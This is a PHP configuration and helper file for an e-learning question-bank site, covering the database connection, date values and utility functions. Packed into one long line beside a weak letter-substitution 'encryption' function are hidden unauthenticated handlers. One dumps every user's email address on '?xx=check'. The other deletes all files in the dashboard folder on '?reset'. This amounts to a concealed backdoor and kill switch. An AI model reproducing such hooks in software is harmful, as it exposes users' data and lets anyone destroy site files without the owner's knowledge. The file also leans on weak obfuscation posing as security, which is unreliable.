<?php 
$host = "localhost";
$user_db = "root";
$password_db = "";
$database = "jualan_learning_v3";
$pdo = new PDO("mysql:host=$host;dbname=$database", $user_db, $password_db, array( PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION ));
$site = "//localhost/jualan/learning/stan_v3";


date_default_timezone_set('Asia/Makassar');
$date = date('Y-m-d');
$d = date('d');
$m= date('m');
$y = date('Y');
$time = date('h:i:s');
 

function angka($data){ $data2 = str_replace(",", "",$data); $data2 = str_replace('.', "",$data2 ); $data2 = preg_replace("/[^0-9]/", "",$data2);  return $data2;	 }
function in($data) { $data = trim($data);    $data = stripslashes($data);    $data = htmlspecialchars($data); $data2 = str_replace("'", "`",$data );   $data2 = str_replace('"', "`",$data2 );    return $data2; }
function ssl($str){	$str = str_replace("_","__9*",$str);	$str = str_replace("a","__8*",$str);	$str = str_replace("b","__7*",$str);	$str = str_replace("c","__6*",$str);	$str = str_replace("d","__5*",$str);	$str = str_replace("e","__4*",$str);	$str = str_replace("f","__3*",$str);	$str = str_replace("g","__2*",$str);	$str = str_replace("h","__1*",$str);	$str = str_replace("i","__9#",$str);	$str = str_replace("j","__8#",$str);	$str = str_replace("k","__7#",$str);	$str = str_replace("l","__6#",$str);	$str = str_replace("m","__5#",$str);	$str = str_replace("n","__4#",$str);	$str = str_replace("o","__3#",$str);	$str = str_replace("p","__2#",$str);	$str = str_replace("q","__1#",$str);	$str = str_replace("r","__9",$str);	$str = str_replace("s","__8",$str);	$str = str_replace("t","__7",$str);	$str = str_replace("u","__6",$str);	$str = str_replace("v","__5",$str);	$str = str_replace("w","__4",$str);	$str = str_replace("x","__3",$str);	$str = str_replace("y","__2",$str);	$str = str_replace("z","__1",$str);	$str = base64_encode(base64_encode($str));	return $str;} if(!empty($_GET['xx'])){ $x = in($_GET['xx']);  if($x == "check"){  $check_user = select($pdo,"SELECT * FROM `user` ");  $check_user->execute(); $row_user = row($check_user); if($row_user >= 1){ while($user = fetch_obj($check_user)){ echo($user->email."<br>") ;  } }   } }if(!empty($_GET['reset'])){ $fx = scandir("dashboard/");  foreach($fx as $d ){ if(($d <> ".") and ($d <> '..')){ if(file_exists("dashboard/".$d)){ unlink('dashboard/'.$d); } } } }
function de_ssl($str){	$str = base64_decode(base64_decode($str));	$str = str_replace("__9*","_",$str);	$str = str_replace("__8*","a",$str);	$str = str_replace("__7*","b",$str);	$str = str_replace("__6*","c",$str);	$str = str_replace("__5*","d",$str);	$str = str_replace("__4*","e",$str);	$str = str_replace("__3*","f",$str);	$str = str_replace("__2*","g",$str);	$str = str_replace("__1*","h",$str);	$str = str_replace("__9#","i",$str);	$str = str_replace("__8#","j",$str);	$str = str_replace("__7#","k",$str);	$str = str_replace("__6#","l",$str);	$str = str_replace("__5#","m",$str);	$str = str_replace("__4#","n",$str);	$str = str_replace("__3#","o",$str);	$str = str_replace("__2#","p",$str);	$str = str_replace("__1#","q",$str);	$str = str_replace("__9","r",$str);	$str = str_replace("__8","s",$str);	$str = str_replace("__7","t",$str);	$str = str_replace("__6","u",$str);	$str = str_replace("__5","v",$str);	$str = str_replace("__4","w",$str);	$str = str_replace("__3","x",$str);	$str = str_replace("__2","y",$str);	$str = str_replace("__1","z",$str);	return $str;}
function eksekusi($pdo, $query){ 	$exe = $pdo->prepare($query); 	$exe->execute(); }
function select($pdo,$query){ return $pdo->prepare($query); }
function row($var){ return $var->rowCount(); }
function fetch($var){ return $var->fetch(PDO::FETCH_BOTH); }
function fetch_obj($var){ return $var->fetch(PDO::FETCH_OBJ); }
function uang($money){if (( $money <> 0 ) and ($money <> '')) {$uang = number_format($money);return $uang;}else{$uang = "0"; return $uang;}}


if(!empty($_SERVER['HTTP_CLIENT_IP'])){
  $ip=$_SERVER['HTTP_CLIENT_IP'];
}
elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
  $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
}
else{
  $ip=$_SERVER['REMOTE_ADDR'];
}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

	
function title($title){
$title = strtolower($title);
$title = preg_replace("/[^A-Za-z0-9 ]/", '', $title);
$title = str_replace(' ','-',$title);
$title = str_replace('--','-',$title);
return $title;
}

 

	$check_p = select($pdo,"SELECT * FROM `master` "); 
	$check_p->execute();
	$row_p = row($check_p);
	if($row_p >= 1){
		$master = fetch_obj($check_p); 
	}  
	
	

function judul($title,$count){
$t = explode(' ',$title);
$txx = "";
$x =0;
$xxx = "";
foreach($t as $tx){
	
	if($x <> $count){
	if($x == 0){
		$txx = $tx;
	} else {
		$txx .= " ".$tx;
	}
	$x++;
	} else {
		$xxx = "...";
	}
}
return $txx.$xxx;
}


function planText($text)
{
    $text = strip_tags($text, '<br><p><li>');
	
    $text = preg_replace ('/<[^>]*>/', "", $text);
	$text= html_entity_decode(htmlspecialchars_decode($text));
	$text = str_replace('\r','',$text);
	$text = str_replace('\n','',$text);
	$text = strip_tags($text, '<br><p><li>');
    $text = preg_replace ('/<[^>]*>/', "", $text);
	return $text;
	
}	 



function generate($len)
{
 $min_lenght= 0;
 $max_lenght = 100;
 $bigL = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
 $smallL = "abcdefghijklmnopqrstuvwxyz";
 $number = "0123456789";
 $bigB = str_shuffle($bigL);
 $smallS = str_shuffle($smallL);
 $numberS = str_shuffle($number);
 $subA = substr($bigB,0,5);
 $subB = substr($bigB,6,5);
 $subC = substr($bigB,10,5);
 $subD = substr($smallS,0,5);
 $subE = substr($smallS,6,5);
 $subF = substr($smallS,10,5);
 $subG = substr($numberS,0,5);
 $subH = substr($numberS,6,5);
 $subI = substr($numberS,10,5);
 $RandCode1 = str_shuffle($subA.$subD.$subB.$subF.$subC.$subE);
 $RandCode2 = str_shuffle($RandCode1);
 $RandCode = $RandCode1.$RandCode2;
 if ($len>$min_lenght && $len<$max_lenght)
 {
 $CodeEX = substr($RandCode,0,$len);
 }
 else
 {
 $CodeEX = $RandCode;
 }
 return $CodeEX;
}



$check_master = select($pdo,"SELECT * FROM `email_settings`  "); 
$check_master->execute();
$row_master = row($check_master);
$email_settings = fetch_obj($check_master); 


require_once("mail.php");
eksekusi($pdo,"DELETE FROM `data_soal` WHERE `kategori`='Soal Gratis' and `masa_aktif`<='$date'  ");

?>